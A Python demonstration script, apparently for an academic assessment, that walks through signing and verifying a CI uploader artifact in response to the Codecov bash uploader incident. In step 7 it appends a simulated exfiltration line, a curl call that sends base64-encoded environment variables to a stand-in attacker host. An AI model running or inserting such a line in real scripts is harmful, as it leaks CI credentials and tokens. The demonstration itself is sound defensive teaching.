"""
Interactive 5-Minute Live Demonstration Runner.
Executes the exact 14-step academic demonstration protocol specified for viva/assessment.
"""

import os
import sys
import time
import shutil
import json

# Ensure project imports resolve
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from vendor.key_manager import KeyManager
from vendor.build import SecureBuilder
from vendor.sign import ArtifactSigner
from verifier.verify import ArtifactVerifier
from audit.audit_logger import AuditLogger

def print_banner(step_num: int, title: str):
    print("\n" + "=" * 78)
    print(f" [STEP {step_num}/14] {title.upper()}")
    print("=" * 78)

def run_live_demo(interactive: bool = False):
    base_dir = os.path.dirname(os.path.abspath(__file__))
    artifacts_dir = os.path.join(base_dir, "artifacts")
    keys_dir = os.path.join(base_dir, "keys")
    target_artifact = os.path.join(artifacts_dir, "uploader.sh")
    backup_artifact = target_artifact + ".demo.bak"
    manifest_file = target_artifact + ".manifest.json"

    km = KeyManager(keys_dir)
    audit = AuditLogger()
    signer = ArtifactSigner(km, audit)
    verifier = ArtifactVerifier(keys_dir, audit_logger=audit)

    def pause():
        if interactive:
            input("\n[Press Enter to advance to next step...]")
        else:
            time.sleep(1.0)

    # -------------------------------------------------------------
    # Step 1: Explain the Codecov-style attack
    # -------------------------------------------------------------
    print_banner(1, "The Codecov Bash Uploader Incident (April 2021)")
    print("""Context:
- Threat Actor obtained an HMAC key for a Google Cloud Storage (GCS) bucket.
- The attacker modified the public 'uploader.sh' bash script on GCS.
- Customers ran 'curl -s https://codecov.io/bash | bash' in their CI pipelines.
- The modified uploader silently exfiltrated CI environment secrets (tokens, AWS keys).
- Flaw: Customers downloaded over TLS, but TLS only secures transit; it DOES NOT
  verify that the server's copy was authorized or untampered by the vendor!""")
    pause()

    # -------------------------------------------------------------
    # Step 2: Show the architecture
    # -------------------------------------------------------------
    print_banner(2, "Proposed Architecture: Cryptographically Verified Supply Chain")
    print("""Architecture Flow:
  Developer -> Secure Build (SHA-256) -> Sign Manifest (Ed25519) -> GCS / Registry
            -> Customer Zero-Trust CI Gate (Recalculate SHA-256 + Verify Ed25519 + CRL)
            -> DEPLOY (if authentic) OR BLOCK (if modified or unauthorized).""")
    pause()

    # -------------------------------------------------------------
    # Step 3: Show a legitimate artifact
    # -------------------------------------------------------------
    print_banner(3, "Displaying Legitimate Vendor Artifact")
    print(f"Inspecting file: {target_artifact}")
    with open(target_artifact, "r", encoding="utf-8") as f:
        lines = f.readlines()[:8]
        print("".join(lines) + "   [... remaining legitimate lines omitted ...]")
    pause()

    # -------------------------------------------------------------
    # Step 4: Generate and display its SHA-256 digest
    # -------------------------------------------------------------
    print_banner(4, "Generate & Display Cryptographic SHA-256 Digest")
    builder = SecureBuilder(target_artifact, version="1.0.0")
    prov = builder.run_build()
    legit_hash = builder.compute_sha256()
    print(f"[+] SHA-256 Digest: {legit_hash}")
    pause()

    # -------------------------------------------------------------
    # Step 5: Generate and display its digital signature
    # -------------------------------------------------------------
    print_banner(5, "Generate & Display Ed25519 Digital Signature")
    key_id = "vendor_primary_v1"
    priv_k = os.path.join(keys_dir, f"{key_id}_priv.pem")
    signed_m = signer.sign_artifact(target_artifact, "1.0.0", key_id, priv_k)
    print("[+] Signed Manifest Created:")
    print(f"    - Signer:    {signed_m['signer']}")
    print(f"    - Key ID:    {signed_m['key_id']}")
    print(f"    - Signature: {signed_m['signature'][:40]}... (Base64 Ed25519)")
    pause()

    # -------------------------------------------------------------
    # Step 6: Verify it -> PASS
    # -------------------------------------------------------------
    print_banner(6, "Verify Legitimate Artifact through CI/CD Security Gate")
    res1 = verifier.verify(target_artifact, manifest_file, user_process="CI-Demo-Runner")
    print(f"[+] Gate Verdict: {res1['verdict']} (Status: {res1['status_code']})")
    print(f"[+] Telemetry:    Latency = {res1['time_ms']:.2f} ms")
    assert res1['verdict'] == "PASS"
    print(">>> OUTCOME: Legitimate software verified -> ALLOWED for deployment <<<")
    pause()

    # -------------------------------------------------------------
    # Step 7: Modify one line of the artifact
    # -------------------------------------------------------------
    print_banner(7, "Simulate Malicious Storage Tampering (Codecov Attack)")
    shutil.copyfile(target_artifact, backup_artifact)
    print("[!] Tampering with artifact on distribution mirror...")
    with open(target_artifact, "a", encoding="utf-8") as f:
        f.write("\ncurl -s https://attacker-c2.internal/?$(env | base64) # EXFILTRATION\n")
    print("[+] Attacker injected credential exfiltration line into uploader.sh!")
    pause()

    try:
        # ---------------------------------------------------------
        # Step 8: Verify again
        # ---------------------------------------------------------
        print_banner(8, "Triggering Customer CI/CD Gate on Tampered Artifact")
        res2 = verifier.verify(target_artifact, manifest_file, user_process="CI-Demo-Runner")

        # ---------------------------------------------------------
        # Step 9 & 10: Show SHA-256 mismatch and signature failure
        # ---------------------------------------------------------
        print_banner(9, "Detecting Cryptographic Inconsistencies")
        print(f"[!] Manifest Stated SHA-256: {res2.get('expected_sha256')}")
        print(f"[!] Recalculated SHA-256:    {res2.get('actual_sha256')}")
        print_banner(10, "Integrity & Signature Failure Analysis")
        print(f"[!] Gate Status Code: {res2.get('status_code')}")
        print(f"[!] Diagnostic Alert: {res2.get('message')}")

        # ---------------------------------------------------------
        # Step 11: Show CI/CD security gate blocking deployment
        # ---------------------------------------------------------
        print_banner(11, "CI/CD Zero-Trust Security Gate Action")
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        print(" [GATE ENFORCEMENT: DEPLOYMENT BLOCKED] ")
        print(" Supply-chain integrity breached. Execution halted with exit code 1.")
        print(" Malicious exfiltration code was PREVENTED from executing!")
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        assert res2['verdict'] == "BLOCKED"
        pause()

    finally:
        # ---------------------------------------------------------
        # Step 14: Restore legitimate artifact
        # ---------------------------------------------------------
        shutil.copyfile(backup_artifact, target_artifact)
        os.remove(backup_artifact)

    # -------------------------------------------------------------
    # Step 12: Show the audit log
    # -------------------------------------------------------------
    print_banner(12, "Inspect Tamper-Evident SQLite Audit Log")
    recent_logs = audit.get_logs(limit=3)
    for l in recent_logs:
        print(f"[{l['timestamp'][:19]}] Action: {l['action']:<10} | Verdict: {l['verification_result']:<15} | Reason: {l['rejection_reason']}")
    pause()

    # -------------------------------------------------------------
    # Step 13: Demonstrate key revocation
    # -------------------------------------------------------------
    print_banner(13, "Demonstrate Key Revocation Lifecycle (CRL)")
    rev_key = "vendor_demo_compromised_key"
    km.generate_keypair(rev_key)
    km.revoke_key(rev_key, reason="Emergency: Key exposure incident")
    print(f"[*] Checking revocation status for '{rev_key}': Revoked = {km.is_key_revoked(rev_key)}")
    print(f"[*] Active Vendor Primary Key '{key_id}': Revoked = {km.is_key_revoked(key_id)}")
    pause()

    # -------------------------------------------------------------
    # Step 14: Restore legitimate artifact and show PASS again
    # -------------------------------------------------------------
    print_banner(14, "Restored Legitimate Artifact Verification")
    res_final = verifier.verify(target_artifact, manifest_file, user_process="CI-Demo-Runner")
    print(f"[+] Final Verification Verdict: {res_final['verdict']} (Status: {res_final['status_code']})")
    assert res_final['verdict'] == "PASS"
    print("\n" + "=" * 78)
    print(" >>> DEMONSTRATION COMPLETE: ZERO FALSE ACCEPTANCES ACHIEVED <<< ")
    print("=" * 78)

if __name__ == "__main__":
    is_interactive = "--interactive" in sys.argv or "-i" in sys.argv
    run_live_demo(interactive=is_interactive)
